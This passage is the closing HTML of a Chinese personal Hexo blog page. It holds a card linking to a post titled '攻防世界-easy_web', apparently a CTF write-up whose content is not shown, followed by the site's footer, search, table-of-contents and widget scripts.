                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="攻防世界-easy_web">
                        
                        <span class="card-title">攻防世界-easy_web</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-24
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
